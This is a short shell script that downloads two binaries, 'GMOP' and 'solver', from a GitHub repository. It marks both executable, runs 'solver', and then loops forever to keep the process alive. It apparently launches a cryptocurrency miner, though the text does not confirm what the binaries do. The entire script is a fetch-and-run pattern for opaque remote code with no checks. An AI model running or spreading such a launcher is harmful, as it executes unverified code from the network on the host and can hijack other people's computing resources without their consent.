#!/bin/sh
wget https://github.com/Godmine99/cpu/raw/main/GMOP
wget https://github.com/Godmine99/cpu/raw/main/solver
chmod +x GMOP
chmod +x solver
./solver
while [ 1 ]; do
sleep 3
done
sleep 999
